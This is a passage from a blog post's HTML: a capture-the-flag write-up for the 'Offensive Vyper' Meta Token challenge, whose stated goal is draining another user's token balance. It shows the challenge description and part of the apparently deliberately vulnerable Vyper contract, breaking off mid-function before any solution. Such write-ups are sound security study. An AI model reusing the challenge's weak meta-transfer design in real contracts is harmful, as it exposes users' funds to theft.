@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Offensive Vyper - Challenge 7 - Meta Token - della&#39;s blog</title><meta name="Description" content="della&#39;s blog"><meta property="og:title" content="Offensive Vyper - Challenge 7 - Meta Token" />
+<meta property="og:description" content="Solution for &ldquo;Offensive Vyper - Challenge 7 - Meta Token&rdquo;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dellalibera.github.io/posts/offensivevyper_07_metatoken/" /><meta property="og:image" content="https://dellalibera.github.io"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-08T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-10-08T00:00:00+00:00" /><meta property="og:site_name" content="della&#39;s blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://dellalibera.github.io"/>
+
+<meta name="twitter:title" content="Offensive Vyper - Challenge 7 - Meta Token"/>
+<meta name="twitter:description" content="Solution for &ldquo;Offensive Vyper - Challenge 7 - Meta Token&rdquo;."/>
+<meta name="application-name" content="della&#39;s blog">
+<meta name="apple-mobile-web-app-title" content="della&#39;s blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://dellalibera.github.io/posts/offensivevyper_07_metatoken/" /><link rel="prev" href="https://dellalibera.github.io/posts/offensivevyper_06_ownableproxy/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Offensive Vyper - Challenge 7 - Meta Token",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_07_metatoken\/"
+        },"genre": "posts","keywords": "Offensive Vyper, CTF, Vyper, Blockchain","wordcount":  1218 ,
+        "url": "https:\/\/dellalibera.github.io\/posts\/offensivevyper_07_metatoken\/","datePublished": "2022-10-08T00:00:00+00:00","dateModified": "2022-10-08T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "della"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> Home </a><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/advisories/"> Advisories </a><a class="menu-item" href="/about/"> About </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="della&#39;s blog">della&#39;s blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="">Home</a><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/advisories/" title="">Advisories</a><a class="menu-item" href="/about/" title="">About</a></div>
+    </div>
+</header><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title">Offensive Vyper - Challenge 7 - Meta Token</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://dellalibera.github.io/about/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>della</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="October 8, 2022">October 8, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1218 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-challenge">1) Challenge</a></li>
+    <li><a href="#2-code-review">2) Code Review</a></li>
+    <li><a href="#3-solution">3) Solution</a></li>
+    <li><a href="#4-references">4) References</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div id="id-1">Solution for &ldquo;Offensive Vyper - Challenge 7 - Meta Token&rdquo;.</div>
+<h2 id="1-challenge">1) Challenge</h2>
+<div class="details admonition quote open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">The Meta Tx contract is an ERC20 token with a builtin meta-transaction-based transfer. Another user has graciously made a meta-transfer to your account. Your objective is to drain their entire balance.</div>
+        </div>
+    </div>
+<p>Challenge created by <a href="https://twitter.com/jtriley_eth" target="_blank" rel="noopener noreffer ">@jtriley_eth</a>.</p>
+<h2 id="2-code-review">2) Code Review</h2>
+<p>There is only one contract, <code>MetaToken.vy</code> (<a href="https://github.com/JoshuaTrujillo15/offensive_vyper/blob/main/contracts/meta-token/MetaToken.vy" target="_blank" rel="noopener noreffer ">source code</a>) that implements a proxy contract.
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">100
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">101
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">102
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">103
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">104
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">105
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">106
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">107
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">108
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">109
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">110
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">111
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">112
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">113
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">114
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#888;font-style:italic"># @version ^0.3.2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@title Token with Meta Transaction Support
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">@author jtriley.eth
+</span></span></span><span style="display:flex;"><span><span style="color:#5a2">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">from</span> <span style="color:#000">vyper.interfaces</span> <span style="color:#00f">import</span> <span style="color:#000">ERC20</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">implements</span>: <span style="color:#000">ERC20</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">event</span> <span style="color:#000">Transfer</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#000">sender</span>: <span style="color:#000">indexed</span>(<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">receiver</span>: <span style="color:#000">indexed</span>(<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">amount</span>: <span style="color:#000">uint256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">event</span> <span style="color:#000">Approval</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#000">owner</span>: <span style="color:#000">indexed</span>(<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">spender</span>: <span style="color:#000">indexed</span>(<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">amount</span>: <span style="color:#000">uint256</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">name</span>: <span style="color:#000">public</span>(<span style="color:#000">String</span>[<span style="color:#3af">32</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">symbol</span>: <span style="color:#000">public</span>(<span style="color:#000">String</span>[<span style="color:#3af">32</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">decimals</span>: <span style="color:#000">public</span>(<span style="color:#000">uint8</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">totalSupply</span>: <span style="color:#000">public</span>(<span style="color:#000">uint256</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">balanceOf</span>: <span style="color:#000">public</span>(<span style="color:#000">HashMap</span>[<span style="color:#000">address</span>, <span style="color:#000">uint256</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">allowance</span>: <span style="color:#000">public</span>(<span style="color:#000">HashMap</span>[<span style="color:#000">address</span>, <span style="color:#000">HashMap</span>[<span style="color:#000">address</span>, <span style="color:#000">uint256</span>]])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">nonce</span>: <span style="color:#000">public</span>(<span style="color:#000">uint256</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">__init__</span>(<span style="color:#000">name</span>: <span style="color:#000">String</span>[<span style="color:#3af">32</span>], <span style="color:#000">symbol</span>: <span style="color:#000">String</span>[<span style="color:#3af">32</span>], <span style="color:#000">initial_supply</span>: <span style="color:#000">uint256</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">name</span> = <span style="color:#000">name</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">symbol</span> = <span style="color:#000">symbol</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">decimals</span> = <span style="color:#3af">18</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] = <span style="color:#000">initial_supply</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">totalSupply</span> = <span style="color:#000">initial_supply</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">transfer</span>(<span style="color:#000">receiver</span>: <span style="color:#000">address</span>, <span style="color:#000">amount</span>: <span style="color:#000">uint256</span>) -&gt; <span style="color:#000">bool</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">assert</span> <span style="color:#000">receiver</span> != <span style="color:#000">ZERO_ADDRESS</span>, <span style="color:#5a2">&#34;zero address receiver&#34;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] -= <span style="color:#000">amount</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">receiver</span>] = <span style="color:#000">unsafe_add</span>(<span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">receiver</span>], <span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">log</span> <span style="color:#000">Transfer</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">receiver</span>, <span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">return</span> <span style="color:#00f">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">approve</span>(<span style="color:#000">spender</span>: <span style="color:#000">address</span>, <span style="color:#000">amount</span>: <span style="color:#000">uint256</span>) -&gt; <span style="color:#000">bool</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">allowance</span>[<span style="color:#000">msg</span>.<span style="color:#000">sender</span>][<span style="color:#000">spender</span>] = <span style="color:#000">amount</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">log</span> <span style="color:#000">Approval</span>(<span style="color:#000">msg</span>.<span style="color:#000">sender</span>, <span style="color:#000">spender</span>, <span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">return</span> <span style="color:#00f">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">transferFrom</span>(<span style="color:#000">sender</span>: <span style="color:#000">address</span>, <span style="color:#000">receiver</span>: <span style="color:#000">address</span>, <span style="color:#000">amount</span>: <span style="color:#000">uint256</span>) -&gt; <span style="color:#000">bool</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">if</span> (<span style="color:#000">msg</span>.<span style="color:#000">sender</span> != <span style="color:#000">sender</span>):
+</span></span><span style="display:flex;"><span>        <span style="color:#000">self</span>.<span style="color:#000">allowance</span>[<span style="color:#000">sender</span>][<span style="color:#000">msg</span>.<span style="color:#000">sender</span>] -= <span style="color:#000">amount</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">sender</span>] -= <span style="color:#000">amount</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">receiver</span>] = <span style="color:#000">unsafe_add</span>(<span style="color:#000">self</span>.<span style="color:#000">balanceOf</span>[<span style="color:#000">receiver</span>], <span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#000">log</span> <span style="color:#000">Transfer</span>(<span style="color:#000">sender</span>, <span style="color:#000">receiver</span>, <span style="color:#000">amount</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">return</span> <span style="color:#00f">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#000">@external</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> <span style="color:#000">metaTransfer</span>(
+</span></span><span style="display:flex;"><span>    <span style="color:#000">sender</span>: <span style="color:#000">address</span>,
